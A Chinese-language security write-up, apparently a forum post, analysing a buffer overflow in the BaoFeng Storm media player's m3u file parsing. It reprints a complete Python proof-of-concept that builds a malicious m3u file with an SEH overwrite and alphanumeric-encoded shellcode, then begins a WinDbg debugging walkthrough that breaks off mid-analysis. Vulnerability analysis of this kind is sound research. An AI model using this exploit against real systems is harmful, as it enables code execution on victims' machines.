
# [原创]简单分析暴风影音读取m3u格式文件漏洞(0day)

## 题目：简单分析暴风影音读取m3u格式文件漏洞

### 作者相关：

作者：仙果

备注：保留版权，欢迎转载，转载请注明出处。

## 0x1.题记

## 0x2.测试环境

## 0x3.分析过程

## 0x4.补救方法

## 0x5.总结

### 0x1.题记

某日惊见`www.exploit-db`网站上公布一则暴风影音的漏洞，是读取`m3u`格式文件的漏洞，立即把`POC`下载回来测试之，发现对滴版本也有效，对应版本弹出计算器，`ShellCode`经过了处理，为纯字母的`ShellCode`，相当的劲爆啊，因有工作的其他事情，没有当即进行分析，留到了今天把漏洞的原理进行了分析，不敢独享，特来共享。文中难免有错漏之处，希望大家莫要在意，毕竟作者乃是半路出家，实属不易，依然属于菜鸟一类，欢迎大家批评指正。

### 0x2.测试环境

2.1 `windows xp sp3_cn` 实体机测试，没有使用虚拟机

2.2 `Strom 2012_3.10.4.8_Cn`

2.3 `010editor` `windbg` `IDA5.5`

### 0x3.分析过程

#### 3.1 Poc代码

`0f4K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2^5M7r3I4G2K9i4c8Q4x3X3c8V1j5W2)9J5k6h3y4G2L8g2)9J5c8X3g2^5M7r3I4G2K9i4c8K6i4K6u0r3x3e0t1#2x3e0j5`.

```
#!/usr/bin/env python

#################################################################

#
# Title: BaoFeng Storm M3U File Processing Buffer Overflow Exploit
# CNVD-ID: CNVD-2010-00752
# Author: Lufeng Li and Qingshan Li of Neusoft Corporation
# Download: 9f6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2L8$3k6W2L8X3N6Q4x3X3g2U0L8$3@1`.
# Test: Put m3u file in root(e.g. c:/ d:/),and open this m3u file
# Platform: Windows XPSP3 Chinese Simplified
# Vulnerable: Storm2012 3.10.4.21
# Storm2012 3.10.4.16
# Storm2012 3.10.4.8
# Storm2012 3.10.3.17
# Storm2012 3.10.2.5
# Storm2012 3.10.1.12
#################################################################
# Code :

file= "baofeng.m3u"
junk ="\x41"*795
nseh="\x61\xe8\xe1"
seh="\xaa\xd7\x40"

jmp ="\x53\x53\x6d\x58\x6d\x05\x11\x22\x6d\x2d\x10\x22\x6d\xac\xe4"
nops ="\x42" * 110
shellcode=("PPYAIAIAIAIAQATAXAZAPA3QADAZA"
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA"
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB"
"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K"
"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL"
"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55"
"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V"
"NQKONQ90***Q8OLMKQY7NXK0T5L4M33MKHOKSMND45JB"
"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT"
"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU"
"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM"
"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC"
"QQ2LRCM0LJA")

fobj=open(file,"w")
payload=junk+nseh+seh+jmp+nops+shellcode
fobj.write(payload)
fobj.close()
```

#### 3.2漏洞触发过程分析

`Windbg`附加 `Storm.exe`进程，并下`ReadFile`函数断点

命令：`bu kernel32!ReadFile`

把`m3u`格式的`POC`文件拖入到`Storm`窗口中，程序在`ReadFile`中断了下来，跳出函数来到
